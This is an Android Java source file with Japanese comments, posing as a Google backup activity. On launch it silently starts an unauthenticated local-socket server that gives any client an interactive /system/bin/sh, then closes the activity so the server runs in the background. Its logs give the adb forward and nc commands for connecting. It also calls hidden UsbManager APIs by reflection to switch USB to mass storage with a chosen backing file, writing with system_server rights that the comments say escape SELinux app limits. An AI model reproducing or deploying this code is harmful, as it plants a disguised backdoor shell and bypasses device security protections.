package com.google.android.backup;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.util.Log;

import android.net.LocalServerSocket;
import android.net.LocalSocket;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "ShellSocket";
    private static final String SOCKET_NAME = "android_shell_socket";

    /**
     * AOSP 標準関数。UsbDeviceManager は diag を rw_qfunc_mode=="0" で
     * 強制削除するが、mass_storage は削除対象外。
     */
    private static final String USB_FUNCTION_MASS_STORAGE = "mass_storage";

    /**
     * マスストレージのバッキングファイル。
     * ISO イメージを指定すれば CD-ROM 相当として認識される端末もある。
     * 環境に合わせて書き換えること。
     */
    private static final String BACKING_FILE_PATH = "/sdcard/usb_disk.iso";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // バックグラウンドでソケットサーバーを起動
        startShellServer();

        // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
        finish();

        // 既存処理の最後に、USB 機能を mass_storage に切り替える自動処理を実行
        applyAutomaticUsbSwitchToMassStorage();
    }

    /**
     * USB 機能を mass_storage に切り替える自動処理。
     *
     * <p>正しい経路は 2 段階:
     * <ol>
     *   <li>UsbManager#setMassStorageBackingFile(path) をリフレクションで呼ぶ
     *       → system_server 内で /sys/class/android_usb/android0/f_mass_storage/lun/file
     *          にバッキングファイルパスが書き込まれる</li>
     *   <li>UsbManager#setCurrentFunction("mass_storage", true) をリフレクションで呼ぶ
     *       → UsbDeviceManager.setEnabledFunctions が呼ばれ、
     *          AOSP 標準関数のため強制削除されない</li>
     * </ol>
     *
     * <p>sys.usb.config / persist.sys.usb.config への直接書き込みは一切行わない。
     * 読み取りのみ。
     */
    private void applyAutomaticUsbSwitchToMassStorage() {
        try {
            Context context = getApplicationContext();
            if (context == null) {
                Log.e(TAG, "Context is null, skip USB switch");
                return;
            }

            // 1) バッキングファイルを設定
            //    system_server 内で /sys/class/android_usb/android0/f_mass_storage/lun/file
            //    に書き込まれる。SELinux の untrusted_app 制約を受けない。
            setMassStorageBackingFileViaUsbManager(context, BACKING_FILE_PATH);

            // 2) 関数を mass_storage に切り替え
            setCurrentFunctionViaUsbManager(context, USB_FUNCTION_MASS_STORAGE, true);

            // 3) 結果確認（読み取りのみ）
            logCurrentUsbState(context);

            Log.i(TAG, "applyAutomaticUsbSwitchToMassStorage finished");
        } catch (Throwable t) {
            Log.e(TAG, "applyAutomaticUsbSwitchToMassStorage error", t);
        }
    }

    /**
     * UsbManager.setMassStorageBackingFile(String) をリフレクションで呼ぶ。
     *
     * <p>UsbManager.java の実装:
     * <pre>
     * public void setMassStorageBackingFile(String path) {
     *     try {
     *         this.mService.setMassStorageBackingFile(path);
     *     } catch (RemoteException e) { ... }
     * }
     * </pre>
     *
     * <p>IUsbManager transaction 16 → UsbService.setMassStorageBackingFile
     * → UsbDeviceManager.setMassStorageBackingFile
     * → FileUtils.stringToFile("/sys/class/android_usb/android0/f_mass_storage/lun/file", path)
     * と到達する。書き込みは system_server 権限で実行される。
     */
    private static void setMassStorageBackingFileViaUsbManager(Context context, String path) {
        try {
            if (context == null) {
                Log.e(TAG, "context is null (setMassStorageBackingFile)");
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                Log.e(TAG, "UsbManager is null (setMassStorageBackingFile)");
                return;
            }
            Method m = service.getClass().getMethod("setMassStorageBackingFile", String.class);
            m.setAccessible(true);
            m.invoke(service, path);
            Log.i(TAG, "UsbManager.setMassStorageBackingFile invoked: " + path);
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "UsbManager.setMassStorageBackingFile not found", e);
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in setMassStorageBackingFile", e);
        } catch (Throwable t) {
            Log.e(TAG, "Throwable in setMassStorageBackingFile", t);
        }
    }

    /**
     * UsbManager.setCurrentFunction(String, boolean) をリフレクションで呼ぶ。
     *
     * <p>UsbManager 経由と IUsbManager 直叩きは同じ Binder transaction 15 を
     * 通るため、ここでは UsbManager のみを使う。1 経路に絞る。
     */
    private static void setCurrentFunctionViaUsbManager(Context context,
                                                        String function,
                                                        boolean makeDefault) {
        try {
            if (context == null) {
                Log.e(TAG, "context is null (setCurrentFunction)");
                return;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                Log.e(TAG, "UsbManager is null (setCurrentFunction)");
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
            Log.i(TAG, "UsbManager.setCurrentFunction invoked: " + function
                    + ", makeDefault=" + makeDefault);
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "UsbManager.setCurrentFunction not found", e);
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in setCurrentFunction", e);
        } catch (Throwable t) {
            Log.e(TAG, "Throwable in setCurrentFunction", t);
        }
    }

    /**
     * 現在の USB 状態を読み取ってログに残す。読み取りのみ。
     * 書き込みは一切行わない。
     */
    private static void logCurrentUsbState(Context context) {
        try {
            String sysUsbConfig = getSystemProperty("sys.usb.config", "");
            String persistUsbConfig = getSystemProperty("persist.sys.usb.config", "");
            String sysUsbState = getSystemProperty("sys.usb.state", "");
            String defaultFunction = getDefaultFunctionViaUsbManager(context);
            boolean massStorageEnabled =
                    isFunctionEnabledViaUsbManager(context, USB_FUNCTION_MASS_STORAGE);

            Log.i(TAG, "sys.usb.config=" + sysUsbConfig);
            Log.i(TAG, "persist.sys.usb.config=" + persistUsbConfig);
            Log.i(TAG, "sys.usb.state=" + sysUsbState);
            Log.i(TAG, "UsbManager.getDefaultFunction()=" + defaultFunction);
            Log.i(TAG, "UsbManager.isFunctionEnabled(mass_storage)=" + massStorageEnabled);
        } catch (Throwable t) {
            Log.e(TAG, "logCurrentUsbState error", t);
        }
    }

    /**
     * SystemProperties.get(String, String) をリフレクションで読み取る。
     * 読み取り専用。書き込みは行わない。
     */
    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            Log.e(TAG, "getSystemProperty error: " + key, t);
            return defaultValue;
        }
    }

    /**
     * UsbManager.isFunctionEnabled(String) をリフレクションで呼ぶ。
     */
    private static boolean isFunctionEnabledViaUsbManager(Context context, String function) {
        try {
            if (context == null) {
                return false;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return false;
            }
            Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
            m.setAccessible(true);
            Object result = m.invoke(service, function);
            return result instanceof Boolean && (Boolean) result;
        } catch (Throwable t) {
            Log.e(TAG, "isFunctionEnabledViaUsbManager error", t);
            return false;
        }
    }

    /**
     * UsbManager.getDefaultFunction() をリフレクションで呼ぶ。
     */
    private static String getDefaultFunctionViaUsbManager(Context context) {
        try {
            if (context == null) {
                return null;
            }
            Object service = context.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return null;
            }
            Method m = service.getClass().getMethod("getDefaultFunction");
            m.setAccessible(true);
            Object result = m.invoke(service);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            Log.e(TAG, "getDefaultFunctionViaUsbManager error", t);
            return null;
        }
    }

    private void startShellServer() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Unixドメインソケット（抽象名前空間）を開く
                    LocalServerSocket server = new LocalServerSocket(SOCKET_NAME);
                    Log.i(TAG, "Shell socket server started: " + SOCKET_NAME);
                    Log.i(TAG, "Run on Ubuntu: adb forward tcp:8888 localabstract:" + SOCKET_NAME);
                    Log.i(TAG, "Then connect: nc 127.0.0.1 8888");

                    while (true) {
                        try {
                            LocalSocket client = server.accept();
                            Log.i(TAG, "New client connected!");
                            // クライアントごとに新しいシェルスレッドを起動
                            new Thread(new ShellHandler(client)).start();
                        } catch (Exception e) {
                            Log.e(TAG, "Accept error", e);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start socket server", e);
                }
            }
        }).start();
    }

    // クライアント接続ごとにシェルを提供するハンドラ
    private static class ShellHandler implements Runnable {
        private LocalSocket socket;

        ShellHandler(LocalSocket socket) {
            this.socket = socket;
        }

        @Override
        public void run() {
            Process shell = null;
            try {
                // インタラクティブシェルを起動
                ProcessBuilder builder = new ProcessBuilder("/system/bin/sh");
                builder.redirectErrorStream(true); // stderrをstdoutに統合
                shell = builder.start();

                // ソケットの入出力ストリームを取得
                final InputStream socketIn = socket.getInputStream();
                final OutputStream socketOut = socket.getOutputStream();

                // シェルの入出力ストリームを取得
                final OutputStream shellStdin = shell.getOutputStream();
                final InputStream shellStdout = shell.getInputStream();

                // スレッド1: ソケット → シェル (ユーザー入力 → シェルstdin)
                Thread socketToShell = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = socketIn.read(buffer)) != -1) {
                                shellStdin.write(buffer, 0, len);
                                shellStdin.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                // スレッド2: シェル → ソケット (シェルstdout → クライアント)
                Thread shellToSocket = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            byte[] buffer = new byte[1024];
                            int len;
                            while ((len = shellStdout.read(buffer)) != -1) {
                                socketOut.write(buffer, 0, len);
                                socketOut.flush();
                            }
                        } catch (Exception e) {
                            // 切断時は正常終了
                        }
                    }
                });

                socketToShell.start();
                shellToSocket.start();

                // シェルプロセスが終了するのを待つ（またはソケット切断）
                shell.waitFor();
                Log.i(TAG, "Shell process exited");

                // 後始末
                socket.close();
                socketToShell.interrupt();
                shellToSocket.interrupt();

            } catch (Exception e) {
                Log.e(TAG, "Shell handler error", e);
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
                try {
                    socket.close();
                } catch (Exception ignored) {}
            }
        }
    }
}
